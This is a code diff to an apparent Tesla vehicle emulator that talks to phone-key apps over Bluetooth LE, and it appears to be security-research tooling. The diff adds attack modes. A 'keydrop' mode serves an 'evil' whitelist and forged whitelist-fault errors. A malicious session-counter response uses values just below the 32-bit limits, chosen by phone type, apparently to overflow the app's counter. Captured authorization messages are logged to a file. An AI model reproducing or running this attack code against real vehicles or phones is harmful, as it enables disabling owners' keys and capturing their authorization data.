@@ -1,6 +1,5 @@
 from pybleno.hci_socket import Emit
 import VCSEC_pb2 as VCSEC
-from google.protobuf.json_format import MessageToJson
 from google.protobuf.text_format import MessageToString
 
 class bcolors:
@@ -20,10 +19,30 @@ def getCommandStatusConfirmation(cnt):
     fromVcsecMsg = VCSEC.FromVCSECMessage(commandStatus=cmdStatus)
     return fromVcsecMsg
 
-def getCommandStatusError(cnt):
+def getCommandStatusError1(cnt):
     msgStatus = VCSEC.SignedMessage_status(counter=cnt,signedMessageInformation=VCSEC.SIGNEDMESSAGE_INFORMATION_FAULT_NOT_ON_WHITELIST)
     cmdStatus = VCSEC.CommandStatus(operationStatus=VCSEC.OPERATIONSTATUS_ERROR,signedMessageStatus=msgStatus) 
     fromVcsecMsg = VCSEC.FromVCSECMessage(commandStatus=cmdStatus)
+    return fromVcsecMsg
+
+def getCommandStatusError2(cnt):
+    msgStatus = VCSEC.SignedMessage_status(counter=cnt,signedMessageInformation=VCSEC.SIGNEDMESSAGE_INFORMATION_FAULT_IV_SMALLER_THAN_EXPECTED)
+    cmdStatus = VCSEC.CommandStatus(operationStatus=VCSEC.OPERATIONSTATUS_ERROR,signedMessageStatus=msgStatus) 
+    fromVcsecMsg = VCSEC.FromVCSECMessage(commandStatus=cmdStatus)
+    return fromVcsecMsg
+
+def getMaliciousSessionCounter(phoneType):
+    
+    val=0
+
+    if (phoneType==1): 
+        val = 4294967293
+
+    else:
+        val = 2147483645
+    
+    sessInfo = VCSEC.SessionInfo(counter = val) 
+    fromVcsecMsg = VCSEC.FromVCSECMessage(sessionInfo=sessInfo)
     return fromVcsecMsg
 
 def getAuthorizationRequest(adToken):
@@ -73,14 +92,28 @@ class Tesla():
         self.cryptoCounter=0
         self.messagelist = []
         self.messagelist.append(bytearray.fromhex('00041a021802'))
-        self.evil=0
+        self.keydrop=0
+        self.cryptocounter=0
         self.human=1
+        self.targetPhoneType=0
 
-    def toggleEvilBit(self):
-        if (self.evil==0):
-            self.evil=1
+    def toggleKeydropBit(self):
+        if (self.keydrop==0):
+            self.keydrop=1
         else:
-            self.evil=0
+            self.keydrop=0
+
+    def toggleTargetPhoneType(self):
+        if (self.targetPhoneType==0):
+            self.targetPhoneType=1
+        else:
+            self.targetPhoneType=0
+
+    def toggleCryptoCounterBit(self):
+        if (self.cryptocounter==0):
+            self.cryptocounter=1
+        else:
+            self.cryptocounter=0
 
     def toggleHumanBit(self):
         if (self.human==0):
@@ -93,10 +126,15 @@ class Tesla():
         vcsecMessage.ParseFromString(data[2 : ]) # strip length header
         if (vcsecMessage.unsignedMessage.HasField("InformationRequest")):
             if (vcsecMessage.unsignedMessage.InformationRequest.informationRequestType==VCSEC.INFORMATION_REQUEST_TYPE_GET_WHITELIST_INFO):
-                if(self.evil==1):
+                if(self.keydrop==1):
                     self.messagelist.append(bytearray.fromhex(self.vehicleConfig['evilWhitelist']))
             elif (vcsecMessage.unsignedMessage.InformationRequest.informationRequestType==VCSEC.INFORMATION_REQUEST_TYPE_GET_EPHEMERAL_PUBLIC_KEY):
                 self.messagelist.append(bytearray.fromhex(self.vehicleConfig['pubkeyResponse']))
+            elif (vcsecMessage.unsignedMessage.InformationRequest.informationRequestType==VCSEC.INFORMATION_REQUEST_TYPE_GET_CAPABILITIES):
+                self.messagelist.append(bytearray.fromhex('00079a010408011001')) # generic capabilities response
+            elif (vcsecMessage.unsignedMessage.InformationRequest.informationRequestType==VCSEC.INFORMATION_REQUEST_TYPE_GET_COUNTER):
+                if(self.cryptocounter==1):
+                    self.messagelist.append(getSerializedMessage(getMaliciousSessionCounter(self.targetPhoneType))) 
             else:
                 self.messagelist.append(bytearray.fromhex('00041a021802'))
                 self.messagelist.append(bytearray.fromhex('000a0a080a02300310011802'))
@@ -107,8 +145,10 @@ class Tesla():
                 authFile = open("auth_codes.txt","a")
                 authFile.write(getHexString(data,0)+"\n")
 
-            if(self.evil==1):
-                self.messagelist.append(getSerializedMessage(getCommandStatusError(self.cryptoCounter)))
+            if(self.keydrop==1):
+                self.messagelist.append(getSerializedMessage(getCommandStatusError1(self.cryptoCounter)))
+            elif(self.cryptocounter==1):
+                self.messagelist.append(getSerializedMessage(getCommandStatusError2(self.cryptoCounter)))
             else:
                 self.messagelist.append(getSerializedMessage(getCommandStatusConfirmation(self.cryptoCounter)))
         pass
